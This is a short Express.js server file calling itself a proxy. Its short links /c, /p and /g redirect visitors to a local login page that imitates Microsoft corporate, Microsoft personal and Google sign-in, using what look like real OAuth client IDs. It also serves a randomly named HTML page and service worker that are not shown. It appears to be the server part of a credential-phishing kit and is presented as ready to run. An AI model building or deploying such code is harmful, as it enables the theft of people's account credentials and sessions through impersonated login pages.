const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Constants from original proxy
const CORPORATE_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const PERSONAL_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const GOOGLE_CLIENT_ID = "717762328687-iludtf96g1hinl76e4lc1b9a82g457nn.apps.googleusercontent.com";

// Handle short URLs
app.get('/c', (req, res) => {
    res.redirect(`/login?method=signin&mode=secure&client_id=${CORPORATE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`);
});

app.get('/p', (req, res) => {
    res.redirect(`/login?method=signin&mode=secure&client_id=${PERSONAL_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F`);
});

app.get('/g', (req, res) => {
    res.redirect(`/login?method=signin&mode=secure&client_id=${GOOGLE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Faccounts.google.com%2F`);
});

// Handle login - serve the HTML file
app.get('/login', (req, res) => {
    try {
        const htmlPath = path.join(__dirname, 'index_smQGUDpTF7PN.html');
        if (fs.existsSync(htmlPath)) {
            res.sendFile(htmlPath);
        } else {
            res.status(404).send('HTML file not found');
        }
    } catch (error) {
        res.status(500).send('Server error');
    }
});

// Serve service worker
app.get('/service_worker_Mz8XO2ny1Pg5.js', (req, res) => {
    try {
        const swPath = path.join(__dirname, 'service_worker_Mz8XO2ny1Pg5.js');
        if (fs.existsSync(swPath)) {
            res.setHeader('Content-Type', 'application/javascript');
            res.sendFile(swPath);
        } else {
            res.status(404).send('Service worker not found');
        }
    } catch (error) {
        res.status(500).send('Server error');
    }
});

// Default route
app.get('/', (req, res) => {
    res.send('Proxy server is running! Use /c, /p, or /g');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});